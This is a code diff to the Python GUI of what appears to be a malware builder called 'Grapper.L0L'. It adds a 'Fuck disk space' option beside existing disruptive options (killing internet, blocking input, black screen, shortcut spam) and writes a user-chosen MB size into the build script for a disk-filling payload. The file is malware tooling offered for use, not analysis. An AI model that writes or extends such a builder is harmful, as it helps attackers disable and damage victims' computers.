@@ -1,5 +1,4 @@
-# Gui is still in beta
-version = "2.0"
+version = "2.1"
 import os
 try:
     import customtkinter
@@ -125,6 +124,7 @@ class App(customtkinter.CTk):
         black_screen = tk.BooleanVar()
         fuck_input = tk.BooleanVar()
         shortcut_spam = tk.BooleanVar()
+        fuck_disk = tk.BooleanVar()
 
         #self.overrideredirect(True)
         self.title("Grapper.L0L")
@@ -246,6 +246,9 @@ class App(customtkinter.CTk):
 
         self.fuck_internet_checkbox = customtkinter.CTkCheckBox(master=self.pc_fucking_frame, fg_color="#FF0005", hover_color="#76090B", text="Fuck internet", variable=fuck_internet)
         self.fuck_internet_checkbox.grid(row=2, column=3, padx=25, pady=10)
+
+        self.fuck_disk_checkbox = customtkinter.CTkCheckBox(master=self.pc_fucking_frame, fg_color="#FF0005", hover_color="#76090B", text="Fuck disk space", variable=fuck_disk)
+        self.fuck_disk_checkbox.grid(row=2, column=4, padx=25, pady=10)
 
         # OTHER FRAME
         self.other_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
@@ -468,6 +471,16 @@ class App(customtkinter.CTk):
             with open("resources/build.py", "r") as f:
                 content = f.read()
                 new_content = content.replace("music_url = ''", f"music_url = '{url}'")
+            with open("resources/build.py", "w") as f:
+                f.write(new_content)
+
+        if self.fuck_disk_checkbox.get() == "1":
+            messagebox.showinfo("Grapper.l0l", "Check console u will be asked for info about disk fucker")
+            update("fuck_disk")
+            sizee = input("MB (disk fucker): ")
+            with open("resources/build.py", "r") as f:
+                content = f.read()
+                new_content = content.replace("Sizexd123 = ''", f"Sizexd123 = '{sizee}'")
             with open("resources/build.py", "w") as f:
                 f.write(new_content)
 
